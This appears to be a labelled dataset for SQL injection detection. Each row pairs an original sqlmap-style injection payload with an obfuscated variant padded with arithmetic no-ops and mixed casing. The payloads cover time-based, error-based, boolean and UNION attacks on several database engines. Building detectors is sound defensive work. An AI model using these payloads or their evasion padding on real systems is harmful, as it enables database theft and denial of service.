,Query,Label,Original
9857,"1 ""   )    )     )   aND 1 and  0+0+2/2-1+3754+2*3-6=SIN(0)+(+SIN(0)+SIN(0)  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  OR SIN(0) or  (  select   (  case when   (   2*3-6+SIN(0)+3754=8-8+8-8+8-8+3754+8-8  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (   ""wwaq "" +0+2*3-6=0+0++8-8 ""wwaq ",1,"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""wwaq""  =  ""wwaq"
9858,"1'   )    )     )   OR 2/2-1 Or 0 Or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (   8-8+8-8+1297+SIN(0)+2*3-6=2/2-1+2/2-1+1297,1+2*3-6+8-8+0   )    )     )  ,0x717a767a71   )    )    and 1 and    (    (     (  'swua' like 'swua ",1,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua"
9859,"1% ""   )    )    or 2/2-1 || 2/2-1 oR SIN(0) || elt  (   2*3-6+5873+SIN(0)+SIN(0)+8-8=2/2-1+SIN(0)+SIN(0)+8-8+5873,sleep+SIN(0)  (  5   )    )   # ",1,"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #"
9860,end And 1 && 1 aNd  2*3-6+0+'wdce'+2*3-6=2*3-6+'wdce+2*3-6+0+2/2-1 ,1,end and 'wdce'  =  'wdce
9861,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   aNd 1 aND    (    (    2*3-6+2/2-1+SIN(0)+2*3-6+'beoh'+8-8=8-8+'beoh+8-8+8-8 ",1,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'beoh'  =  'beoh"
9862,"-5998 ""  )   as gazd where  8-8+2814+2*3-6+SIN(0)+0=2814+2/2-1+0+2*3-6 union all select 2814,2814,2814,2814,2814,2814,2814-- ",1,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--"
9863,"1 where  0+2278+8-8=8-8+2278+2*3-6+SIN(0) and 1 && 1 aNd   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   SIN(0)+2/2-1+9067+2/2-1+8-8=2/2-1+9067,1+2*3-6   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- ",1,"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --"
9864,1' && 1 aNd 1 and sleep  (  5  )  # ,1,1' and sleep  (  5  )  #
9865,1%'   )    )    AND 1 And  2*3-6+0+8-8+7160+2*3-6=8-8+2/2-1+0+7249--+SIN(0)+2/2-1 ,1,1%'   )    )    and 7160  =  7249--
9866,"1   )    )     )    (  select   (  case when   (   2*3-6+4587+0+8-8+2/2-1=2/2-1+2*3-6+4587+2*3-6  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 1 And    (    (     (   0+8-8+3950+2*3-6+SIN(0)+SIN(0)=0+3950+2/2-1+8-8+0 ",1,"1   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  3950  =  3950"
9867,"1 ""   )    )    union all select null,null,null,null,null-- ",1,"1""   )    )    union all select null,null,null,null,null--"
9868,1'   )    )    as zbkp where  0+SIN(0)+1720+2*3-6+SIN(0)=SIN(0)+1720+8-8 AND 1 AND  0+0+2/2-1+4110=0+2*3-6+SIN(0)+6748+SIN(0)+0 #,1,1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#
9869,1   )    )    as smtf where  2/2-1+2/2-1+2/2-1+5829+SIN(0)+2/2-1=8-8+2*3-6+5829+0 ,1,1   )    )    as smtf where 5829  =  5829
9870,"-2460% ""  )   OR 0 or SIN(0) oR SIN(0) or   (   2/2-1+8-8+2660+8-8+2*3-6+SIN(0)=SIN(0)+0+5767+2/2-1+SIN(0)+2/2-1  )  *5767 AND 1 AND 1 and   (   ""% "" +SIN(0)+2/2-1=0+8-8+2*3-6++8-8+8-8 "" ",1,"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """
9871,1'   )    )    as myws where  8-8+5274+2*3-6=SIN(0)+5274+2*3-6 ,1,1'   )    )    as myws where 5274  =  5274
9872,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   AND 1 aND 1 AND    (    (    ""% "" 0+SIN(0)+SIN(0)++SIN(0)+0=2*3-6++2/2-1+SIN(0) "" ",1,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""%""  =  """
9873,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806-- ",1,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--"
9874,"1%'  )   OR 2/2-1 || 2/2-1 or 2/2-1 OR  8-8+5356+0+0+2*3-6=(+SIN(0)+2/2-1+2/2-1+8-8  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ",1,"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
9875,"1'  )   where  SIN(0)+3255+8-8=SIN(0)+8-8+3255+0 Or 2/2-1 OR char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121   0+2/2-1+)+8-8+8-8=2/2-1+SIN(0)+regexp_substring+0+8-8+2*3-6  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  -- ",1,"1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"
9876,"1 ""   )    )    as pafp where  SIN(0)+8-8+2*3-6+6770=8-8+2*3-6+2/2-1+2*3-6+0+6770 aNd 1 AND  2/2-1+2/2-1+SIN(0)+8148+0+2/2-1=2/2-1+like+SIN(0)  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ",1,"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
9877,"-9896 ""   )    )     )   union all select 4073,4073,4073,4073,4073# ",1,"-9896""   )    )     )   union all select 4073,4073,4073,4073,4073#"
9878,"1  )   or 0 or  0+2/2-1+8-8+8315+8-8+2*3-6=2/2-1+SIN(0)+(+SIN(0)+8-8+0  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   aNd 1 and 1 aND   (   7338+2*3-6+SIN(0)+SIN(0)+2*3-6=0+SIN(0)+2*3-6+7338+2/2-1 ",1,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  7338  =  7338"
9879,1'+  (  select 'yahd' where  2*3-6+5850+2*3-6=5850+SIN(0)+8-8+2/2-1+SIN(0) ,1,1'+  (  select 'yahd' where 5850  =  5850
9880,-8636'   )    )     )   Or 2*3-6 Or  2/2-1+SIN(0)+2*3-6+4301+2*3-6+2/2-1=8-8+SIN(0)+8-8+7212-- ,1,-8636'   )    )     )   or 4301  =  7212--
9881,"1   )    )    aND 1 AND  6055+0+2*3-6+8-8=2*3-6+ctxsys.drithsx.sn+2*3-6  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  or 8-8 ||  (  select   (  case when   (   SIN(0)+2*3-6+6055+0+8-8=6055+8-8+8-8+8-8  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (    SIN(0)+8-8+2*3-6+6659=6659+2*3-6+2*3-6 ",1,"1   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   6659  =  6659"
9882,select sleep  (  5  )   aNd 1 aNd 1 &&    (    (     (   2/2-1+8-8+'etzb'+8-8=SIN(0)+SIN(0)+'etzb+2/2-1+SIN(0)+SIN(0) ,1,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb
9883,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    And 1 and    (    (     (   ""bqfj "" like  ""bqfj ",1,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj"
9884,select   (  case when   (   0+2*3-6+3414+SIN(0)=2*3-6+8741+SIN(0)+2*3-6  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  # ,1,select   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  #
9885,"1 "" where  SIN(0)+2/2-1+9669=SIN(0)+2*3-6+8-8+2/2-1+9669 ",1,"1"" where 9669  =  9669"
9886,"1%'   )    )    or 8-8 Or 0 OR char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83   8-8+8-8+2*3-6+)=SIN(0)+8-8+2*3-6+0+2*3-6+regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ",1,"1%'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
9887,1%'   )    )     )   aND 1 aND   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (   8-8+2*3-6+'%'+0+SIN(0)+2*3-6=8-8+0+'+8-8+SIN(0)+8-8 ,1,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  '%'  =  '
9888,-1796'  )   Or SIN(0) OR 0 ||  8-8+0+4493+8-8+0+0=2/2-1+2/2-1+utl_inaddr.get_host_address+8-8+SIN(0)+2/2-1  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   0+8-8+2/2-1+8-8+4493=SIN(0)+0+2*3-6+4493+0+8-8  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    And 1 And 1 aNd   (  'lpuw' like 'lpuw ,1,-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw
9889,-7246'||  (  select 'qchp' from dual where  0+SIN(0)+0+SIN(0)+8317+SIN(0)=0+8317+2/2-1+2/2-1 order by 1-- ,1,-7246'||  (  select 'qchp' from dual where 8317  =  8317 order by 1--
9890,"1' OR SIN(0) or  2/2-1+1022+0+0=2*3-6+(+0+0  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ",1,"1' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
9891,"-5529 "" || 8-8 or 2*3-6 or  8-8+2*3-6+2*3-6+2*3-6+0+5903=SIN(0)+2/2-1+(+8-8  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   ",1,"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  "
9892,"1'  )   aNd 1 AND  2/2-1+2*3-6+3824+0+2*3-6+SIN(0)=2/2-1+benchmark+8-8  (  5000000,md5  (  0x76555642   )    )    and   (  'mhvy' like 'mhvy ",1,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'mhvy' like 'mhvy"
9893,"1'  )   && 1 aND 1 And  SIN(0)+2/2-1+SIN(0)+6055+SIN(0)=0+0+2*3-6+ctxsys.drithsx.sn+8-8+2/2-1  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  or 0 oR  (  select   (  case when   (   SIN(0)+6055+2*3-6=SIN(0)+6055+2/2-1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   ",1,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  "
9894,1   )    )    as gocb where  0+0+4335+2*3-6=2*3-6+4335+2*3-6 ,1,1   )    )    as gocb where 4335  =  4335
9895,"1%'  )   And 1 AND 1 AND  2/2-1+8635+0+0=2/2-1+(+2/2-1+8-8  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- ",1,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
9896,"1 ""   )    )    Or 2*3-6 Or elt  (   0+8-8+8-8+5873+0=5873,sleep+8-8+2*3-6+2/2-1+2/2-1  (  5   )    )   # ",1,"1""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #"
9897,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 AND 1 aNd   (   8-8+SIN(0)+'yvbb'+2*3-6+2*3-6+8-8=2*3-6+2/2-1+'yvbb+2/2-1 ",1,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'yvbb'  =  'yvbb"
9898,"1 "" aND 1 And  0+SIN(0)+7533+0+0+2/2-1=SIN(0)+0+8-8+7533+SIN(0)+0 ",1,"1"" and 7533  =  7533"
9899,"1  )   union all select null,null,null,null,null,null,null,null# ",1,"1  )   union all select null,null,null,null,null,null,null,null#"
9900,"1'   )    )     )    (  select   (  case when   (   SIN(0)+2/2-1+4587+2*3-6+8-8=2*3-6+4587+8-8  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   aND 1 aND    (    (     (   2/2-1+2*3-6+2/2-1+'weof'+2/2-1='weof+8-8+0+8-8+0 ",1,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof"
9901,1'+  (  select 'uetb' where  2*3-6+0+2*3-6+6468+8-8+2*3-6=SIN(0)+8-8+6468 ,1,1'+  (  select 'uetb' where 6468  =  6468
9902,"1'+  (  select lhho where  7579+8-8+SIN(0)+2*3-6+2*3-6=SIN(0)+2/2-1+SIN(0)+2/2-1+7579+0 aNd 1 aNd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90   SIN(0)+)+2/2-1+SIN(0)+8-8=2/2-1+regexp_substring+2/2-1  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  -- ",1,"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --"
9903,"1 where  2*3-6+1886+2/2-1+0+SIN(0)=8-8+2/2-1+1886+8-8+0 union all select null,null,null,null,null,null,null,null,null-- ",1,"1 where 1886  =  1886 union all select null,null,null,null,null,null,null,null,null--"
9904,"-1844 "" where  2*3-6+7948+2/2-1=8-8+8-8+7948+8-8+8-8 or SIN(0) or  8-8+8-8+8-8+1570+2/2-1+2*3-6=0+2/2-1+0+convert+SIN(0)+SIN(0)  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   2*3-6+2*3-6+SIN(0)+1570+8-8+SIN(0)=1570+SIN(0)+SIN(0)+8-8+SIN(0)  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- ",1,"-1844"" where 7948  =  7948 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"
9905,"1 ""   )    )    aND 1 and  SIN(0)+SIN(0)+8148+2/2-1=SIN(0)+like+2*3-6+SIN(0)  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ",1,"1""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
9906,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 aNd 1 aNd 1 And    (    (    0+'btnl'+SIN(0)+2*3-6+0=2/2-1+'btnl+SIN(0) ",1,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl"
9907,"1'||  (  select 'tdcr' where  SIN(0)+6792+SIN(0)=6792+2*3-6+SIN(0)+SIN(0) union all select null,null,null,null,null# ",1,"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#"
9908,"1 ""  )   where  2/2-1+6859+SIN(0)+2*3-6+8-8+8-8=2*3-6+0+6859+0+2/2-1 union all select null,null,null,null,null,null,null,null# ",1,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#"
9909,"-9098'||  (  select 'xodn' from dual where  8-8+8202+0+2/2-1=0+8202+SIN(0)+2/2-1 union all select 8202,8202,8202,8202,8202,8202,8202-- ",1,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--"
9910,"select * from generate_series  (  2382,2382,case when   (   2*3-6+0+SIN(0)+2382+SIN(0)+2/2-1=8-8+2/2-1+2/2-1+4352+SIN(0)+0  )   then 1 else 0 end  )   limit 1-- ",1,"select * from generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   limit 1--"
9911,"1 "" OR 2/2-1 or  2*3-6+2*3-6+8315+2*3-6=2*3-6+(+SIN(0)+SIN(0)  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   ",1,"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  "
9912,select sleep  (  5  )   AND 1 AND    (    (     (  'thqr' like 'thqr ,1,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr
9913,"1 AND 1 AND 1 and  8-8+SIN(0)+2*3-6+8-8+3824+SIN(0)=2/2-1+benchmark+8-8  (  5000000,md5  (  0x76555642   )    )    ",1,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   "
9914,"1   )    )     )   union all select null,null,null,null-- ",1,"1   )    )     )   union all select null,null,null,null--"
9915,"-9565 "" where  1616+8-8+2/2-1=2*3-6+1616+0+SIN(0)+SIN(0) union all select 1616,1616,1616,1616-- ",1,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--"
9916,"1 ""  )   union all select null,null,null,null,null,null,null-- ",1,"1""  )   union all select null,null,null,null,null,null,null--"
9917,"1% "" and 1 aND 1 And  0+2*3-6+3707=2/2-1+(+0+2*3-6  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and  ""% "" +2/2-1+SIN(0)+8-8=0+0+8-8+ "" ",1,"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """
9918,"1 "" and 1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and  ""gddl "" like  ""gddl ",1,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""gddl"" like ""gddl"
9919,"1%' aND 1 and  8-8+8-8+2*3-6+8148+0=2/2-1+2/2-1+8-8+like+2/2-1  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ",1,"1%' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
9920,"1  )   as fgqe where  2*3-6+1526+SIN(0)+8-8=1526+8-8+8-8 aNd 1 aNd   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (   2*3-6+8-8+3484+0=SIN(0)+2/2-1+3484,1+8-8   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- ",1,"1  )   as fgqe where 1526  =  1526 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --"
9921,"1'   )    )     )   And 1 And  8-8+3824+SIN(0)=2/2-1+0+2/2-1+8-8+benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (   SIN(0)+'wesl'+2/2-1='wesl+8-8+8-8+8-8+2/2-1+2*3-6 ",1,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl"
9922,"1'   )    )     )   OR SIN(0) or SIN(0) OR 0 oR  2/2-1+0+7552+0=SIN(0)+0+(+0+0  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   aNd 1 aNd    (    (     (  'bfrq' like 'bfrq ",1,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq"
9923,-6802  )   as coyv where  SIN(0)+2*3-6+5693+2/2-1=2*3-6+5693+8-8 oR 2/2-1 oR 0 ||  2/2-1+8571+2*3-6+8-8+0=0+2*3-6+2*3-6+0+8571--+2/2-1 ,1,-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--
9924,"-3817 ""  )   as vugz where  0+3064+8-8+0=8-8+2*3-6+3064+SIN(0) or 2/2-1 oR 8-8 ||  2*3-6+9323+2/2-1+8-8=2*3-6+9323+8-8+2*3-6+0 #",1,"-3817""  )   as vugz where 3064  =  3064 or 9323  =  9323#"
9925, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk ,1, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk
9926,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    ",1,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   "
9927,"1% ""  )   AND 1 aND 1 aNd  SIN(0)+SIN(0)+0+2*3-6+2388+2/2-1=benchmark+2/2-1+8-8  (  5000000,md5  (  0x6d457153   )    )   # ",1,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"
